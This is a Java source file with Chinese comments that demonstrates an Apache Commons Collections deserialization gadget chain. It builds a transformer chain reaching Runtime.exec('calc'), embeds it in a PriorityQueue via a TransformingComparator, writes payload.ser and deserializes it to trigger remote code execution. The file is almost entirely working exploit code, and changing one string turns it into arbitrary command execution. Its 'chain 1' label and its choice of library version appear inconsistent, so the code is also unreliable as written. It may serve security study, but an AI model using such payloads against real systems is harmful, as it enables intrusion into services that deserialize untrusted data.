//CC链1 
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.comparators.TransformingComparator;

import java.io.*;
import java.util.PriorityQueue;

public class CC1demo {

    public static void main(String[] args) throws Exception {
        // 真实利用链
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] { String.class, Class[].class },
                        new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke",
                        new Class[] { Object.class, Object[].class },
                        new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class },
                        new Object[] { "calc" })
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        TransformingComparator comparator = new TransformingComparator(transformerChain);

        // PriorityQueue 反序列化入口
        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        // 填充两个元素，占位即可
        priorityQueue.add(1);
        priorityQueue.add(1);

        // Serialize
        try (ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("payload.ser"))) {
            out.writeObject(priorityQueue);
        }

        // Deserialize (触发RCE)
        try (ObjectInputStream in = new ObjectInputStream(new FileInputStream("payload.ser"))) {
            in.readObject(); // 会弹计算器
        }
    }
}
